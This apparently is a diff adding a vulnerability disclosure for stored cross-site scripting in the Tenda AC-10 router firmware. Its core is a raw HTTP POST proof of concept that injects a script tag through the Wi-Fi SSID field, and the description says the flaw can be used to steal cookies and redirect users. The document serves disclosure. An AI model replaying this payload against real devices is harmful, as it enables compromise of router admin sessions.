@@ -1,0 +1,31 @@
+### Description
+
+An issue was discovered on Tenda AC1200 MV-MIMO Dual Band GB wifi Router (AC-10)  devices with firmware V15.03.06.50_multi. The application allows a remote attacker to introduce arbitrary JavaScript by crafting malicious form values that are later not sanitized and also steal a cookie to perform user redirection to a malicious website  on the system via a crafted post request.
+
+### Poc
+
+POST /goform/WifiBasicSet HTTP/1.1
+Host: 192.168.0.1
+Content-Length: 198
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.0.1
+Referer: http://192.168.0.1/wireless_ssid.html?random=0.41230087488343825&
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: password=7094beb6ee60cf68246fff013d1c1f05xvgtgb
+Connection: close
+
+wrlEn=1&wrlEn_5g=1&security=wpawpa2psk&security_5g=wpawpa2psk&ssid=%3Cscript%3Ealert(1)%3C%2Fscript%3E&ssid_5g=Pankaj_5G&hideSsid=0&hideSsid_5g=0&wrlPwd=Abelife%40123&wrlPwd_5g=Abet%40123
+
+Now Visit Dashboard
+
+XSS is executed
+
+https://github.com/Pankaj1337x1998/IOT-CVE/blob/main/tendaxss.png
+
+## Acknowledgment
+
+Pankaj Kumar Thakur (@nep_1337_1998) from Nepal
